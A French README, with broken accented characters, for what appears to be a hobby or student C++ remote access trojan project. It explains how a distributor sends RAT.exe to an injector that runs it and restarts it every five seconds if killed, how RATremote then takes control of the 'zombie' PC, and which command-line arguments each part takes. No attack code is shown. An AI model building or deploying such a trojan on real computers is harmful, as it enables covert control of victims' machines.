STRUCTURE PROJET:
-Les ex�cutables sont dans /BuildC++/buil/Release.
-/RAT contient le code source et des .bat espi�gle pouvant �tre
ex�cut� MANUELLEMENT ("put", suivi de "start") sur l'ordinateur infect�.
-La racine contient des .bat pouvant lanc� les ex�cutables du 
dossier Release. Par d�faut, uilises 127.0.0.1 comme adresse.

R�SUM� D�ROULEMENT:
-Distributor.exe attend une connection de l'injecteur pour lui envoyer RAT.exe.
-Injector.exe se connecte � Distributor.exe, puis demande, re�ois et ex�cute RAT.exe.
***IMPORTANT: L'injecteur red�marre le RAT.exe tout les 5 secondes si
***RAT.exe est termin� d'une fa�on innatendu, il doit �tre termin� avec
***la commande "exit" � partir de RATremote.
-Lorsque lanc� par l'injecteur, RAT.exe se connecte � RATremote.
-RATremote attand une connection du RAT.exe pour avoir acc�s au PC zombie.

LANCEMENT:
Les ex�cutables peuvent �tre lanc�s dans n'importe quel ordre, ils 
attendront simplement de recevoir une r�ponse � leur tantative de
connection/r�ception.

Les ex�cutables sont lanc�s en ligne de commande avec les arguments suivant:
Hote:
    -Distributor.exe <Num_PortA>  
    -RATremote.exe <Num_PortB>
Zombie:
    -Injector.exe <NomPCdistant|Addr_IP> <Num_PortA> <Fichier_a_Envoyer.exe>
    -RAT.exe <NomPCdistant|Addr_IP> <Num_PortA>

Note: Injector � �t� hard cod� avec <127.0.0.1> <2020> <RAT.exe> comme parametres,
      d�commenter #define HARD_CODED_ARGS pour utiliser la ligne de commande.
Note: RAT � �t� hard cod� avec <127.0.0.1> <2030> comme parametres,
      d�commenter #define HARD_CODED_ARGS pour utiliser la ligne de commande
      (Les parametres seront recu de Injector.exe, 127.0.0.1 2030 par d�faut).






